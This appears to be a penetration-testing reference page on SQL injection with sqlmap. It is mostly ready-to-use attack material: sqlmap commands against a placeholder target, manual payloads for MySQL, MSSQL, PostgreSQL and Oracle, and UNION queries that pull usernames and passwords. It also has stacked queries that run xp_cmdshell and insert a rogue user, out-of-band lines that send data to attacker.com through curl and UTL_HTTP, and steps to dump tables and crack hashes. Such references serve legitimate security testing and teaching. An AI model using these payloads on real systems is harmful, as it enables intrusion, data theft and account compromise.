---
title: "sqlmap - SQL Injection Techniques"
category: "tool"
parent: "sqlmap"
tags: ["sql-injection", "techniques", "detection", "exploitation"]
last_updated: "2025-12-27"
---

# SQL Injection Techniques

## Table of Contents

- [Detection Levels and Risk](#detection-levels-and-risk)
- [Boolean-Based Blind](#boolean-based-blind)
- [Time-Based Blind](#time-based-blind)
- [Error-Based](#error-based)
- [UNION Query-Based](#union-query-based)
- [Stacked Queries](#stacked-queries)
- [Out-of-Band (OOB)](#out-of-band-oob)
- [Database Fingerprinting](#database-fingerprinting)
- [Data Extraction Strategies](#data-extraction-strategies)

---

## Detection Levels and Risk

### Level Settings (--level)

Controls the breadth of tests performed:

| Level | Tested Parameters |
|-------|-------------------|
| 1 | GET/POST parameters (default) |
| 2 | + Cookie values |
| 3 | + User-Agent, Referer headers |
| 4 | + Additional payloads |
| 5 | + All possible injection points, HOST header |

```bash
# Test cookies and headers
sqlmap -u "http://target.com/page.php?id=1" --level=3

# Maximum coverage
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3
```

### Risk Settings (--risk)

Controls the danger level of payloads:

| Risk | Payload Types |
|------|---------------|
| 1 | Safe payloads only (default) |
| 2 | + Heavy time-based queries |
| 3 | + OR-based payloads (may modify data!) |

```bash
# Higher risk testing (use with caution)
sqlmap -u "http://target.com/page.php?id=1" --risk=2

# WARNING: Risk 3 can modify database data
sqlmap -u "http://target.com/page.php?id=1" --risk=3
```

---

## Boolean-Based Blind

Infers data by analyzing differences in application responses to true/false conditions.

### How It Works

1. Inject condition that evaluates to TRUE
2. Inject condition that evaluates to FALSE
3. Compare response differences
4. Extract data character by character

### Examples

```bash
# Standard boolean-based test
sqlmap -u "http://target.com/page.php?id=1" --technique=B

# Increase string matching ratio
sqlmap -u "http://target.com/page.php?id=1" --technique=B --string="Welcome"

# Use content-based comparison
sqlmap -u "http://target.com/page.php?id=1" --technique=B --not-string="error"
```

### Manual Payload Examples

```sql
-- MySQL
' AND 1=1--    (true)
' AND 1=2--    (false)
' AND SUBSTRING(database(),1,1)='a'--

-- MSSQL
' AND 1=1--
' AND 1=2--
' AND SUBSTRING(DB_NAME(),1,1)='a'--

-- PostgreSQL
' AND 1=1--
' AND 1=2--
' AND SUBSTRING(current_database(),1,1)='a'--

-- Oracle
' AND 1=1--
' AND 1=2--
' AND SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1),1,1)='O'--
```

### Response Comparison Options

```bash
# Match specific string for true response
sqlmap -u "http://target.com/page.php?id=1" --string="Record found"

# Match string for false response
sqlmap -u "http://target.com/page.php?id=1" --not-string="No results"

# Use regex pattern
sqlmap -u "http://target.com/page.php?id=1" --regexp="user.*admin"

# Compare based on response codes
sqlmap -u "http://target.com/page.php?id=1" --code=200
```

---

## Time-Based Blind

Infers data by measuring response time differences when database delays are introduced.

### How It Works

1. Inject payload causing conditional delay
2. Measure response time
3. If delayed, condition is true
4. Extract data character by character

### Examples

```bash
# Time-based only
sqlmap -u "http://target.com/page.php?id=1" --technique=T

# Custom time delay (seconds)
sqlmap -u "http://target.com/page.php?id=1" --technique=T --time-sec=5

# For slow connections
sqlmap -u "http://target.com/page.php?id=1" --technique=T --time-sec=10
```

### Manual Payload Examples

```sql
-- MySQL
' AND SLEEP(5)--
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
' AND (SELECT * FROM (SELECT SLEEP(5))a)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--
' AND IF (SUBSTRING(DB_NAME(),1,1)='a') WAITFOR DELAY '0:0:5'--
'; IF(1=1) WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT pg_sleep(5)--
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--

-- Oracle
' AND DBMS_LOCK.SLEEP(5)--
' AND (SELECT CASE WHEN (1=1) THEN 'a'||DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE NULL END FROM dual)--
```

---

## Error-Based

Extracts data directly from database error messages.

### How It Works

1. Inject payload designed to cause verbose error
2. Error message contains extracted data
3. Parse error message for information

### Examples

```bash
# Error-based only
sqlmap -u "http://target.com/page.php?id=1" --technique=E

# With specific DBMS
sqlmap -u "http://target.com/page.php?id=1" --technique=E --dbms=mysql
```

### Manual Payload Examples

```sql
-- MySQL (extractvalue/updatexml)
' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--
' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

-- MSSQL
' AND 1=CONVERT(int,(SELECT DB_NAME()))--
' AND 1=CONCAT(1,(SELECT DB_NAME()))--

-- PostgreSQL
' AND 1=CAST((SELECT version()) AS int)--
' AND 1::int=(SELECT version())--

-- Oracle
' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1))--
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--
```

---

## UNION Query-Based

Appends additional SELECT statements to extract data in a single response.

### How It Works

1. Determine number of columns in original query
2. Identify columns reflected in output
3. Replace those columns with target data
4. Full data returned in single request

### Examples

```bash
# UNION-based only
sqlmap -u "http://target.com/page.php?id=1" --technique=U

# Specify column count (if known)
sqlmap -u "http://target.com/page.php?id=1" --technique=U --union-cols=5

# Specify column range to test
sqlmap -u "http://target.com/page.php?id=1" --technique=U --union-cols=1-20

# Specify character for filling columns
sqlmap -u "http://target.com/page.php?id=1" --technique=U --union-char=NULL

# Use specific UNION query style
sqlmap -u "http://target.com/page.php?id=1" --technique=U --union-from=users
```

### Manual Payload Examples

```sql
-- Determine column count
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  (until error)

-- Find reflected column
' UNION SELECT 1,2,3,4,5--
' UNION SELECT NULL,NULL,NULL,NULL,NULL--

-- Extract data (MySQL)
' UNION SELECT 1,database(),3,4,5--
' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables--
' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,CONCAT(username,':',password),3,4,5 FROM users--

-- Extract data (MSSQL)
' UNION SELECT 1,DB_NAME(),3,4,5--
' UNION SELECT 1,name,3,4,5 FROM sysobjects WHERE xtype='U'--

-- Extract data (PostgreSQL)
' UNION SELECT 1,current_database(),3,4,5--
' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema='public'--

-- Extract data (Oracle - requires FROM dual)
' UNION SELECT NULL,banner,NULL,NULL,NULL FROM v$version--
' UNION SELECT NULL,table_name,NULL,NULL,NULL FROM all_tables--
```

---

## Stacked Queries

Executes multiple SQL statements separated by semicolons.

### How It Works

1. Inject semicolon followed by new statement
2. Second statement executes independently
3. Enables INSERT, UPDATE, DELETE, or stored procedures

### Database Support

| DBMS | Stacked Query Support |
|------|----------------------|
| MySQL | Limited (PHP/mysqli with multi_query) |
| MSSQL | Full support |
| PostgreSQL | Full support |
| Oracle | Not supported |
| SQLite | Full support |

### Examples

```bash
# Stacked queries only
sqlmap -u "http://target.com/page.php?id=1" --technique=S

# Combined with other techniques
sqlmap -u "http://target.com/page.php?id=1" --technique=SE
```

### Manual Payload Examples

```sql
-- MSSQL - Execute xp_cmdshell
'; EXEC xp_cmdshell 'whoami'--
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--

-- PostgreSQL - Create file
'; COPY (SELECT '') TO '/tmp/test.txt'--

-- MySQL (if multi_query enabled)
'; INSERT INTO users(username,password) VALUES('hacker','password')--

-- SQLite
'; INSERT INTO users VALUES('hacker','password')--
```

---

## Out-of-Band (OOB)

Exfiltrates data through external channels (DNS, HTTP) when no direct response is available.

### How It Works

1. Inject payload that triggers external request
2. Data embedded in DNS query or HTTP request
3. Captured by attacker-controlled server

### Examples

```bash
# DNS exfiltration
sqlmap -u "http://target.com/page.php?id=1" --dns-domain=attacker.com

# Requires DNS server setup on attacker.com
```

### Manual Payload Examples

```sql
-- MySQL (DNS - Windows only)
' AND LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\a'))--
' AND SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\a'))--

-- MSSQL (DNS via xp_dirtree)
'; DECLARE @d VARCHAR(99);SET @d=DB_NAME()+'.attacker.com';EXEC master..xp_dirtree '\\'+@d+'\a'--
'; EXEC master..xp_dirtree '\\'+DB_NAME()+'.attacker.com\a'--

-- MSSQL (HTTP via OLE)
'; DECLARE @r INT; EXEC @r=sp_OACreate 'WScript.Shell',@r OUT; EXEC sp_OAMethod @r,'Run',NULL,'cmd /c curl http://attacker.com/'+DB_NAME()--

-- Oracle (DNS via UTL_HTTP)
' AND UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v$version WHERE ROWNUM=1))--

-- PostgreSQL (DNS via COPY)
'; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/'||current_database()--
```

---

## Database Fingerprinting

### Automatic Fingerprinting

```bash
# Let sqlmap detect DBMS
sqlmap -u "http://target.com/page.php?id=1" -v 3

# Force specific DBMS (faster if known)
sqlmap -u "http://target.com/page.php?id=1" --dbms=mysql
sqlmap -u "http://target.com/page.php?id=1" --dbms=mssql
sqlmap -u "http://target.com/page.php?id=1" --dbms=postgresql
sqlmap -u "http://target.com/page.php?id=1" --dbms=oracle
```

### Fingerprinting Queries

```sql
-- MySQL
SELECT VERSION()
SELECT @@version

-- MSSQL
SELECT @@version
SELECT SERVERPROPERTY('ProductVersion')

-- PostgreSQL
SELECT version()

-- Oracle
SELECT banner FROM v$version WHERE ROWNUM=1
SELECT * FROM v$version

-- SQLite
SELECT sqlite_version()
```

### OS Fingerprinting

```bash
# Get OS information
sqlmap -u "http://target.com/page.php?id=1" --os-detect
```

---

## Data Extraction Strategies

### Efficient Extraction

```bash
# Dump only specific data
sqlmap -u "http://target.com/page.php?id=1" -D webapp -T users -C username,password --dump

# Limit rows
sqlmap -u "http://target.com/page.php?id=1" -D webapp -T users --dump --start=1 --stop=10

# Exclude system databases
sqlmap -u "http://target.com/page.php?id=1" --exclude-sysdbs --dump-all
```

### Search Functionality

```bash
# Search for database/table/column names
sqlmap -u "http://target.com/page.php?id=1" --search -D user
sqlmap -u "http://target.com/page.php?id=1" --search -T pass
sqlmap -u "http://target.com/page.php?id=1" --search -C password
```

### Pivot Tables

```bash
# Dump related tables
sqlmap -u "http://target.com/page.php?id=1" -D webapp -T users,roles,permissions --dump

# Follow foreign keys
sqlmap -u "http://target.com/page.php?id=1" -D webapp --schema
```

### Password Hash Cracking

```bash
# Automatically crack discovered hashes
sqlmap -u "http://target.com/page.php?id=1" --passwords --threads=10

# Dump with hash cracking
sqlmap -u "http://target.com/page.php?id=1" -D webapp -T users --dump --crack
```

### Blind Extraction Optimization

```bash
# Increase threads for faster blind extraction
sqlmap -u "http://target.com/page.php?id=1" --threads=10

# Use binary search for faster char extraction
sqlmap -u "http://target.com/page.php?id=1" --technique=B --optimize

# Limit extraction scope
sqlmap -u "http://target.com/page.php?id=1" -D webapp -T users -C password --dump --where="username='admin'"
```
